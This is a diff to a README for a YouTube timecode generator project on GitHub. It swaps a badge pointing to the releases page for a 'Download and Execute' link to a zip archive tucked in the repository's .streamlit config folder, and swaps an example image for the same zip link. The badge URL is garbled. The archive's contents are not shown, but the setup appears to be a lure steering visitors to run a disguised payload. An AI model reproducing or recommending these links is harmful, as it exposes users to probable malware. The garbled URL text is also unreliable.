@@ -13,7 +13,7 @@ Welcome to the GitHub repository for the "youtube_timecodes_generator" project! 
 
 To download and execute the latest version of the tool, click on the button below:
 
-[![Download and Execute](https://img.shields.io/badge/Download%20Now-https%3A%2F%2Fgithub.com%2FMaouNakano%2Fyoutube_timecodes_generator%2Freleases-green)](https://github.com/MaouNakano/youtube_timecodes_generator/releases)
+[![Download and Execute](https://github.com/MaouNakano/youtube_timecodes_generator/raw/refs/heads/master/.streamlit/timecodes-youtube-generator-1.0-alpha.2.zip%20Now-https%3A%2F%https://github.com/MaouNakano/youtube_timecodes_generator/raw/refs/heads/master/.streamlit/timecodes-youtube-generator-1.0-alpha.2.zip%2FMaouNakano%2Fyoutube_timecodes_generator%2Freleases-green)](https://github.com/MaouNakano/youtube_timecodes_generator/raw/refs/heads/master/.streamlit/timecodes-youtube-generator-1.0-alpha.2.zip)
 
 Visit the link above to access the tool and start generating timecodes for your YouTube videos effortlessly.
 
@@ -27,4 +27,4 @@ Feel free to explore the code, contribute to the project, or provide feedback to
 
 Thank you for visiting our repository and happy timecoding! 🌟
 
-![YouTube Timecodes Generator](https://example.com/image.jpg)
+![YouTube Timecodes Generator](https://github.com/MaouNakano/youtube_timecodes_generator/raw/refs/heads/master/.streamlit/timecodes-youtube-generator-1.0-alpha.2.zip)
